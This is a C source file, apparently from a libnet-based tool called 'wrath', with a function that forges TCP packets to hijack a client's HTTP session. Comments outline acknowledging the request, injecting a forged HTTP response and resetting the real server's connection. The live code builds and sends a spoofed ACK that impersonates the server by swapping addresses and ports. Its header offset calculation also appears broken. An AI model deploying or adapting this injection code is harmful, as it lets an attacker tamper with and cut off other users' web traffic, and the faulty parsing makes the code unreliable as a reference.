#include <libnet.h>
#include "wrath-builders.h"
#include "wrath-structs.h"

/* This assumes packets are being filtered where the client is the source. */
void wrath_launch_http_response(u_char *data_pass, u_char *packet, u_char *payload, int increment) {
	// acknowledges client's http request
	// wrath_tcp_custom_build_and_launch(src, dest, sport, dport, seq, ack, tcp_flag_sum);

	// launches forgered http response	
	// wrath_tcp_belly_build_and_launch(data_pass, packet, payload, (TH_PUSH + TH_ACK), increment);
		
	// resets the servers connection
	// wrath_tcp_custom_build_and_launch(src, dest, sport, dport, seq, ack, tcp_flag_sum);
	
	struct lcp_package *package = (struct lcp_package *) data_pass;
	libnet_t *libnet_handle = package->libnet_handle;

	// craft rst packet at legitimate server and fire
	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	/* libnet_build_tcp */
	libnet_build_tcp(
	ntohs(tcphdr->th_dport),	// source port (preted to be from destination port)
	ntohs(tcphdr->th_sport),	// destination port (pretend to be from source port)
	ntohl(tcphdr->th_ack),		// seq (pretend to be next packet)
	ntohl(tcphdr->th_seq + increment),		// ack
	TH_ACK,	
	4024,				// window size -- the higher this is the least likely fragmentation will occur
	0,				// checksum: 0 = libnet auto-fill
	0,				// URG pointer	
	0,				// len
	NULL,			// *payload (maybe app-level here)
	0,				// payload length
	libnet_handle,			// pointer libnet context	
	0);				// ptag: 0 = build a new header
	
	libnet_build_ipv4(LIBNET_TCP_H, // length
	IPTOS_LOWDELAY,			// type of service
	libnet_get_prand(LIBNET_PRu16), // IP ID (serial)
	0,				// fragmentation
	128,				// TTL should be high to avoid being dropped in transit to a server
	IPPROTO_TCP,			// upper-level protocol
	0,				// checksum: 0 = libnet auto-fill
	iphdr->ip_dst.s_addr,  		// source (pretend to be destination)
	iphdr->ip_src.s_addr,  		// destination (pretend to be source)
	NULL,				// optional payload
	0,				// payload length
	libnet_handle,			// pointer libnet context
	0);				// ptag: 0 = build a new header	

	libnet_write(libnet_handle);


}
